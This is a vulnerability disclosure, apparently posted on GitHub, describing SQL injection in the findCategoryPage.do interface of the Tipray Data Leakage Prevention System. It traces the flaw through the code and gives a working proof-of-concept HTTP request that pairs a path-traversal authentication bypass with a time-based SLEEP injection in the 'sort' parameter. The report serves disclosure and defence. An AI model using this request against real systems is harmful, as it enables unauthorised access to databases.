# SQL Injection Vulnerability in the findCategoryPage.do Interface of Tipray Data Leakage Prevention System

## Basic Overview
We have already learned about some basic information of the system developer and the reasons for authentication bypass in https://github.com/FightingLzn9/vul/blob/main/%E5%A4%A9%E9%94%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F-1.md.

To reduce your review burden, we will not repeat the details in this report.

## Vulnerability Analysis
We identified a sink point in `com.trwfe.controller.InvokerController#findCategoryPage`.

Based on the analysis in the above link, we know that the `PageVo` class is insecure and its parameters are controllable by external users.

<img width="1645" height="531" alt="image" src="https://github.com/user-attachments/assets/15608593-698e-48c5-9227-bc50c89ce1bd" />

Letâ€™s trace the `findAllCategoryPage` method here.

<img width="1824" height="1045" alt="image" src="https://github.com/user-attachments/assets/27ad4801-5802-4ac5-97fa-feba420e928a" />

Continue to trace down to the mapper layer.

<img width="1951" height="565" alt="image" src="https://github.com/user-attachments/assets/bfc10f24-a89c-48fe-81c6-d2dbd4cc3417" />

Direct concatenation of parameters leads to SQL injection. The following Proof of Concept (PoC) can be constructed:

```
POST http://ip/trwfe/login.jsp/..;/invoker/findCategoryPage.do HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=BBE157F1DBA868496A6CB76724EA3D28
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

tenantId=1&sort=1+AND+(SELECT+1087+FROM+(SELECT(SLEEP(5)))JYfg)
```

<img width="1986" height="678" alt="image" src="https://github.com/user-attachments/assets/16e695a1-a4a6-4194-8645-7e62db959856" />

<img width="1885" height="826" alt="image" src="https://github.com/user-attachments/assets/872a17cb-f9d0-4282-b2b1-752e2086960b" />

The request successfully caused a delay, confirming that the `findCategoryPage.do` interface has an SQL injection vulnerability.

Thank you for your review. Wish you a pleasant day!
